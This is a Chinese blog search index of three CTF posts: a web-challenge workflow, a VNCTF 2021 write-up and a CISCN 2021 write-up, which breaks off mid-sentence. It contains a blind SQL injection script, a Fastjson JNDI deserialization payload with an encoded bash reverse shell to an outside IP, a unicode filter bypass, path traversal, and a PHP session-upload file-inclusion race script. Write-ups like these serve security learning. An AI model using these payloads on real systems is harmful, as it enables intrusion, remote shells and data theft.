<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF Web题的工作流</title>
      <link href="5bd315f0e878/"/>
      <url>5bd315f0e878/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Web题的工作流"><a href="#CTF-Web题的工作流" class="headerlink" title="CTF Web题的工作流"></a>CTF Web题的工作流</h1><p>采用工作流的方式，让自己减少失误。避免出现在简单题耗费大量的时间。</p><ul><li>疏忽大意</li><li>收集信息不齐</li></ul><h2 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1 信息搜集"></a>1 信息搜集</h2><h3 id="1-1-这个网站使用了技术"><a href="#1-1-这个网站使用了技术" class="headerlink" title="1.1 这个网站使用了技术"></a>1.1 这个网站使用了技术</h3><p>这个问题是非常有必要的，在 Python 中的模版注入会多于 PHP 中。</p><p>可以使用网页的拓展来测试属于什么语言，例如类似下面的拓展：</p><ul><li>index.php</li><li>index.html</li><li>index.cgi</li><li>…</li></ul><p>如果不起作用，可能采用了类似 Django 的 URL 分离的技术。</p><p>我们还可以根据网站的 404 页面来确认自己的猜想，404 页面还可以获取到 web server 的信息。即访问一个不存在的地址 /THIS_PAGE_DOESNT_EXIST，判断网站使用了 Apache 还是 Nginx？</p><p>另外，Web server 还可以通过网站的响应头获得。</p><p>最后，还可以考虑使用 Chrome 插件 Wappalyzer 来识别网站所使用的技术。</p><h3 id="1-2-理解网站是怎么工作的"><a href="#1-2-理解网站是怎么工作的" class="headerlink" title="1.2 理解网站是怎么工作的"></a>1.2 理解网站是怎么工作的</h3><p>在这一阶段，我们需要了解 Web 应用程序是怎么工作的。有哪些功能可以使用？如何使用这些功能？</p><p>浏览整个网站过后，想象网站的代码大致是怎样的？网站提供的功能容易出现哪些漏洞？</p><h3 id="1-3-测试常见的目录和文件"><a href="#1-3-测试常见的目录和文件" class="headerlink" title="1.3 测试常见的目录和文件"></a>1.3 测试常见的目录和文件</h3><p>在国外，CTFs 通常不允许使用自动化的扫描工具，网站的目录通常是显而易见的。</p><p>但在国内，最好多收集一点字典和拓展后缀，指不定来个 <code>.index.php.swo</code> 或 <code>.listing</code>。</p><p>最好的路径爆破工具：burpsuite，不接受反驳。</p><h3 id="1-4-检查源文件和请求头"><a href="#1-4-检查源文件和请求头" class="headerlink" title="1.4 检查源文件和请求头"></a>1.4 检查源文件和请求头</h3><h4 id="1-4-1-源文件"><a href="#1-4-1-源文件" class="headerlink" title="1.4.1 源文件"></a>1.4.1 源文件</h4><p>分析每一个文件（HTML, JavaScript, CSS），获得有趣的注释、隐藏的特性、奇怪的脚本。我通常使用 burpsuite 来分析源码和请求头。</p><blockquote><p>Note：CSS 文件也需要进行审计，可能通过 background 语句包含其他链接。</p></blockquote><h4 id="1-4-2-HTTP包审计"><a href="#1-4-2-HTTP包审计" class="headerlink" title="1.4.2 HTTP包审计"></a>1.4.2 HTTP包审计</h4><p>当经过每个文件的时候，检查请求和响应头是否有不正常的内容。</p><blockquote><p>Note：你CTF题做得越多，你就越能确定什么是重要的，什么不是。</p></blockquote><h3 id="1-5-笔记模版"><a href="#1-5-笔记模版" class="headerlink" title="1.5 笔记模版"></a>1.5 笔记模版</h3><p>简单而清晰的模版，能让人快速找到信息之间的联系。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Backend : </span><br><span class="line">- Server : Apache 2.4.6 (CentOS)</span><br><span class="line">- Language : PHP</span><br><span class="line"></span><br><span class="line">Webapp description :</span><br><span class="line">- The app is a messaging system, you can send messages to specific users and read messages.</span><br><span class="line"></span><br><span class="line">Site map :</span><br><span class="line">- &#x2F;register.php (GET&#x2F;POST)</span><br><span class="line">- &#x2F;login.php (GET&#x2F;POST)</span><br><span class="line">- &#x2F;read_message.php (GET)</span><br><span class="line">  - &#x2F;read_message.php?messages&#x3D;2 (GET)</span><br><span class="line">- &#x2F;send_message.php (GET&#x2F;POST)</span><br><span class="line">- &#x2F;users.php (GET)</span><br><span class="line">- &#x2F;admin (Unauthorized)</span><br><span class="line"></span><br><span class="line">- &#x2F;js&#x2F; (Directory listing enabled)</span><br><span class="line">- &#x2F;css&#x2F; (Directory listing enabled)</span><br><span class="line">- &#x2F;images&#x2F; (Directory listing enabled)</span><br><span class="line"></span><br><span class="line">Interesting Headers :</span><br><span class="line">- Access-Control-Allow-Origin: http:&#x2F;&#x2F;127.0.0.1:9876</span><br></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考文章：</p><ul><li><a href="https://github.com/Corb3nik/Web-Exploitation-Workflow#ctf-tactics">https://github.com/Corb3nik/Web-Exploitation-Workflow#ctf-tactics</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021年 VNCTF realezjvav复现</title>
      <link href="3aec5f27ec11/"/>
      <url>3aec5f27ec11/</url>
      
        <content type="html"><![CDATA[<p>hint：</p><ul><li>不会有web手电脑里没IDA吧，不会吧不会吧</li><li>仔细阅读package.json哦/汪汪</li></ul><h2 id="1-1-基于运行时的报错注入"><a href="#1-1-基于运行时的报错注入" class="headerlink" title="1.1 基于运行时的报错注入"></a>1.1 基于运行时的报错注入</h2><p>尝试进行SQL注入，有关键字过滤。union、sleep、benchmark、rlike都被过滤了。</p><p>猜测为有过滤的字符型注入，尝试使用其他方法进行盲注，或者尝试进行报错注入。优先考虑报错注入。使用name_const方法可以可以导致报错。payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 正常</span><br><span class="line">&#39; or (1) or &#39;</span><br><span class="line">&#39; or if(0, pow(2, 1024), 0) or &#39;</span><br><span class="line"># 报错</span><br><span class="line">&#39; or if(1, pow(2, 1024), 0) or &#39;</span><br></pre></td></tr></table></figure><p>这里我普及了一下报错注入，报错注入大致可以分为 2 种。一是基于报错信息回显，二是基于运行时报错（从而实现布尔注入）。整理了一下基于运行时报错的Payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考教程：https://xz.aliyun.com/t/4914#toc-4</span></span><br><span class="line"><span class="comment"># 运行时错误：ERROR 1690 (22003): DOUBLE value is out of range in &#x27;pow(2,1024)</span></span><br><span class="line"><span class="comment"># 21000、22001、22002、22003</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">0</span>, <span class="keyword">pow</span>(<span class="number">2</span>, <span class="number">1024</span>), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">0</span>, cot(<span class="number">0</span>), <span class="number">0</span>);</span><br><span class="line"><span class="comment"># exp函数的参数在大于709的情况下会导致sql语句执行失败</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">0</span>, <span class="keyword">exp</span>(<span class="number">710</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">0</span>, (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> mysql.user), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">0</span>, (cot(<span class="number">0</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>) * <span class="number">2</span>) x</span><br><span class="line"><span class="keyword">from</span> mysql.user</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">if</span>(<span class="number">0</span>, x, <span class="number">0</span>);</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 绕过预检查。使用动态解析变量的函数</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="number">0</span>, ST_X(ST_GeomFromText(<span class="string">&#x27;POINT(mads)&#x27;</span>)), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="number">0</span>, ST_MPointFromText(<span class="string">&#x27;MADS&#x27;</span>), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(<span class="number">0</span>, ST_GeomFromText(<span class="string">&#x27;MADS&#x27;</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>报错注入的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本信息</span></span><br><span class="line">base_url = <span class="string">&#x27;http://1a0a3805-97fa-47cd-b059-951bde2b91d0.node3.buuoj.cn&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">response</span>):</span></span><br><span class="line">    true_info = <span class="string">&#x27;Ha1c9on&#x27;</span></span><br><span class="line">    false_info = <span class="string">&#x27;500&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 中文编码</span></span><br><span class="line">    text = response.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">        text = text.encode(<span class="string">&#x27;latin-1&#x27;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> true_info <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> false_info <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;judge发生错误&quot;</span>)</span><br><span class="line">        print(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_sql</span>(<span class="params">sql</span>):</span></span><br><span class="line">    url = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>/user/login&#x27;</span></span><br><span class="line"></span><br><span class="line">    fuzz = range(<span class="number">32</span>, <span class="number">126</span>)</span><br><span class="line">    fuzz = list(map(chr, fuzz))</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># pos从1开始递增，直到fuzz字典跑完，退出。</span></span><br><span class="line">        pos += <span class="number">1</span></span><br><span class="line">        right_c = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> fuzz:</span><br><span class="line">            ascii_c = ord(c)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: <span class="string">f&quot;&#x27; or (if(ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;ascii_c&#125;</span>, 1, (select 1 from mysql.user))) or &#x27;&quot;</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            print(data[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line">            params = &#123;&#125;</span><br><span class="line">            cookies = &#123;&#125;</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">            sleep(<span class="number">0.2</span>)</span><br><span class="line">            response = requests.post(url=url,</span><br><span class="line">                                     headers=headers,</span><br><span class="line">                                     params=params,</span><br><span class="line">                                     data=data,</span><br><span class="line">                                     cookies=cookies)</span><br><span class="line">            <span class="comment"># print(str(response.text).encode(&#x27;latin-1&#x27;).decode(&#x27;unicode_escape&#x27;))</span></span><br><span class="line">            <span class="keyword">if</span> judge(response):</span><br><span class="line">                right_c = c</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        result += right_c</span><br><span class="line">        print(result)</span><br><span class="line">        <span class="comment"># 没有找到</span></span><br><span class="line">        <span class="keyword">if</span> right_c == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&#x27;result&#x27;</span>, result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">    payloads = [</span><br><span class="line">        <span class="string">&quot;SELECT database()&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SELECT USER()&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SELECT group_concat(schema_name) from information_schema.schemata&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SELECT group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SELECT group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SELECT password from `user` where username=&#x27;admin&#x27;&quot;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="comment"># for payload in payloads:</span></span><br><span class="line">    <span class="comment"># sql = payload</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sql = input(<span class="string">&#x27;sql:&#x27;</span>)</span><br><span class="line">        print(<span class="string">&#x27;payload:&#x27;</span>, sql)</span><br><span class="line">        execute_sql(sql)</span><br><span class="line">        print(<span class="string">&#x27;----------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BUUCTF中对请求速度做了限制，所以在请求前加了 sleep。通过 exp 查到下面的信息：</p><ul><li>database：ctf</li><li>tables：user</li><li>user表的字段：<br>id,username,password,Host,User,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shut(没读完，太多了)</li><li>admin的密码：no_0ne_kn0w_th1s</li></ul><p>登录admin账号，然后发现网站存在本地任意文件读取，尝试读取本地配置文件。</p><ul><li>../../../../../../../../../../../../etc/passwd</li><li>maven配置文件：../../../../../pom.xml</li></ul><p>在pom.xml中发现该网站使用了fastjson库，版本是1.2.27。在创建角色时，发送的信息为 json。</p><h2 id="1-2-FastJson反序列化"><a href="#1-2-FastJson反序列化" class="headerlink" title="1.2 FastJson反序列化"></a>1.2 FastJson反序列化</h2><p>使用 <a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a> 搭建ldap服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNS43NC4xMjMvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;121.5.74.123&quot;</span><br></pre></td></tr></table></figure><blockquote><p>-C 代表执行命令，而后面的命令是 java.lang.Runtime.exec 执行的代码，和常见的命令不太相同，可以采用 <a href="http://www.jackson-t.ca/runtime-exec-payloads.html">java.lang.Runtime.exec() Payload Workarounds - @Jackson_T</a> 将命令 <code>bash -i &gt;&amp; /dev/tcp/121.5.74.123/9999 0&gt;&amp;1</code> 转换成 <code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNS43NC4xMjMvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code>。</p></blockquote><p>在服务器执行 <code>nc -lvnp 9999</code> 接收 shell。</p><p>Burp 发送Payload：(记得替换ldap的地址)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roleJson&#x3D;&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;name&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;121.5.74.123:1389&#x2F;yhqxxx&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现被检测出出来，使用 unicode 编码绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;e&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0043\u006C\u0061\u0073\u0073&quot;,&quot;\u0076\u0061\u006C&quot;:&quot;\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C&quot;&#125;,&quot;\u006E\u0061\u006D\u0065&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065&quot;:&quot;ldap:&#x2F;&#x2F;121.5.74.123:1389&#x2F;a82emq&quot;,&quot;\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure><p>最后可以在根目录找到 flag 文件。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021年 CISCN writeup</title>
      <link href="17ffd8ef2cd0/"/>
      <url>17ffd8ef2cd0/</url>
      
        <content type="html"><![CDATA[<h1 id="2021年-CISCN-writeup"><a href="#2021年-CISCN-writeup" class="headerlink" title="2021年 CISCN writeup"></a>2021年 CISCN writeup</h1><h2 id="1-1-easy-sql"><a href="#1-1-easy-sql" class="headerlink" title="1.1 easy_sql"></a>1.1 easy_sql</h2><p>进行手动测试，发现可以进行报错注入。Payload 为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;) AND updatexml(1, concat(0x7e, (database()), 0x7e), 1)--</span><br></pre></td></tr></table></figure><p>尝试读取数据库表的表名，发现information关键字被过滤，猜了一下表名为 fl4g、flag，最后确定表名为 flag。</p><p>使用 join 爆出字段名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>*<span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">as</span> a <span class="keyword">join</span> flag b)c</span><br><span class="line"><span class="keyword">select</span>*<span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">as</span> a <span class="keyword">join</span> flag b <span class="keyword">using</span>(<span class="keyword">id</span>,<span class="string">`no`</span>))c</span><br><span class="line"><span class="keyword">select</span>*<span class="keyword">from</span> (<span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">as</span> a <span class="keyword">join</span> flag b <span class="keyword">using</span>(<span class="keyword">id</span>,<span class="string">`no`</span>,<span class="string">`29023c0e-87b4-4f21-9ba3-f515c88243e2`</span>))c</span><br></pre></td></tr></table></figure><p>使用 group 语句查询 flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(<span class="string">`29023c0e-87b4-4f21-9ba3-f515c88243e2`</span>) <span class="keyword">from</span> flag </span><br></pre></td></tr></table></figure><p><code>CISCN&#123;pN9yX-L8msl-YA6OI-WZ5QG-m</code>，只获得了一半的 flag。 </p><p>尝试绕过截断。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>((<span class="keyword">SELECT</span> <span class="keyword">group_concat</span>(<span class="string">`29023c0e-87b4-4f21-9ba3-f515c88243e2`</span>) <span class="keyword">from</span> flag), <span class="number">30</span>, <span class="number">60</span>) </span><br></pre></td></tr></table></figure><p><code>-m7DeE-&#125;</code>，获得另一半的 flag。</p><p>最后拼接得到flag为：CISCN{pN9yX-L8msl-YA6OI-WZ5QG-m7DeE-}</p><h2 id="1-2-easy-source"><a href="#1-2-easy-source" class="headerlink" title="1.2 easy_source"></a>1.2 easy_source</h2><p>通过扫描目录，发现<code>.index.php.swo</code>泄漏源码。</p><p>发现和<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">fslh-writeup</a>题目非常相似，尝试利用 PHP 内置类中的 ReflectionMethod 来读取 User 类里面各个函数的注释。</p><p>最后发现flag也是在q函数的注释中，payload为：<code>?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment</code></p><h2 id="1-3-middle-source"><a href="#1-3-middle-source" class="headerlink" title="1.3 middle_source"></a>1.3 middle_source</h2><p>扫描目录可以发现文件 .listing，在 you_can_seeeeeeee_me.php 路径中可以看到 phpinfo 的信息。</p><p>通过 phpinfo 中给出的 session 地址，和首页进行任意文件包含，可以联想到利用PHP_SESSION_UPLOAD_PROGRESS 进行文件包含。</p><p>参考文章《<a href="https://www.cnblogs.com/NPFS/p/13795170.html">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a>》完成 expoit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://121.36.31.240:24071/&quot;</span></span><br><span class="line">COUNT = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">file = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Run</span>(<span class="params">threads_name</span>):</span></span><br><span class="line">    <span class="keyword">global</span> COUNT</span><br><span class="line">    read_value = COUNT</span><br><span class="line"></span><br><span class="line">    resp = requests.post(</span><br><span class="line">    url=url,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php echo &quot;slug01sh&quot;;print_r(scandir(&quot;/etc/geecbbgagc/adbjhijbed/fhbccehdff/bafebihfee/efbdacbhae&quot;)); ?&gt;&#x27;</span>, <span class="comment"># session内容</span></span><br><span class="line">        <span class="string">&#x27;cf&#x27;</span>:<span class="string">&#x27;../../../../../../var/lib/php/sessions/ieadabjdfh/sess_flag&#x27;</span>, <span class="comment"># 文件名称</span></span><br><span class="line">        <span class="string">&#x27;&#x27;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;, <span class="comment"># !</span></span><br><span class="line">    files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, file)&#125;, </span><br><span class="line">    cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;flag&quot;</span>&#125;, <span class="comment"># ! PHPSESSID</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;slug01sh&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        print(resp.text)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;COUNT in Thread-%s is %d&quot;</span> % (str(threads_name), read_value))</span><br><span class="line">    COUNT = read_value + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        t = threading.Thread(target=Run,args=(j,))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(threads)):</span><br><span class="line">        threads[i].join()</span><br><span class="line">    print(<span class="string">&quot;Finally, The COUNT is %d&quot;</span> % (COUNT,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>在 data 的 PHP_SESSION_UPLOAD_PROGRESS 字段写入需要执行的代码，最后读到 flag 位于 <code>/etc/geecbbgagc/adbjhijbed/fhbccehdff/bafebihfee/efbdacbhae</code>，文件名为 fl444444g。</p><p>利用 index.php 